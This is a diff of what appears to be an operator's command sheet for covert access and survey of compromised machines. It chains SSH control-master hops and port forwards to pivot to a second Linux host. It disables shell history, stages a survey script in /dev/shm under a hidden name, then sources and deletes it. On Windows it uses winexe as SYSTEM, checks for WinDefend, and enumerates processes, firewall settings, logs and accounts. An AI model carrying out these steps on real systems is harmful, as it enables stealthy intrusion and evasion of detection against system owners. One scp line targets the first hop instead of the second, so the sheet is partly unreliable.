@@ -7,7 +7,7 @@ ssh -v -x -M -f -N -o ControlPath=/tmp/hop-1 root@1.1.1.1
 ssh -o ControlPath=/tmp/hop-1 root@1.1.1.1
 
 unset HISTFILE HISTFILESIZE HISTSIZE 
-export LESSHISTFILE=/dev/null
+
 scp -o ControlPath=/tmp/hop-1 /cline_101117_op1/survey.sh root@1.1.1.1:/dev/shm/.a
 source /dev/shm/.a
 rm -f /dev/shm/.a
@@ -60,8 +60,21 @@ find / -type f -mmin -120 | egrep -v '\/sys|\/proc' 2>/dev/null
 ls -latr /dev/shm
 ls -latr /tmp
 ls -latr /var/log
-ssh -S /tmp/hop-1 -O exit root@1.1.1.1
+ssh -S /tmp/hop-# -O exit root@1.1.1.1
 
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+2nd LINUX BOX ACCESS COMMANDS
+ssh -o ControlPath=/tmp/hop-1 -O forward root@1.1.1.1 -L 10602:2.2.2.2:22
+
+ssh -v -x -M -f -N -o ControlPath=/tmp/hop-2 -p 10602 root@127.0.0.1
+ssh -o ControlPath=/tmp/hop-2 root@127.0.0.1
+unset HISTFILE HISTFILESIZE HISTSIZE
+scp -o ControlPath=/tmp/hop-2 /root/Downloads/survey.sh root@1.1.1.1:/dev/shm/.a
+source /dev/shm/.a
+rm -f /dev/shm/.a
+ 
+ 
+ssh -S /tmp/hop-# -O exit root@127.0.0.1
 
  
 ===============
@@ -75,6 +88,7 @@ winexe -U admin3 //127.0.0.1 cmd.exe --system
 
 date /t && time /t
 tasklist /V
+tasklist /svc | findstr WinDefend
 wmic process get commandline, processid, parentprocessid /format:list
 netstat -anob
 netsh advfirewall show allprofiles
@@ -93,6 +107,11 @@ dir /o:d /t:w c:\windows\system32\winevt\logs
 Wevtutil qe security /c:25 /rd:true /f:text (whatever has updated from previous dir)
 auditpol /get /category:*
 ipconfig /all
+
+
+########################
+# COPY ALL SURVEY INFO #
+########################
 
 Systeminfo
 Net user
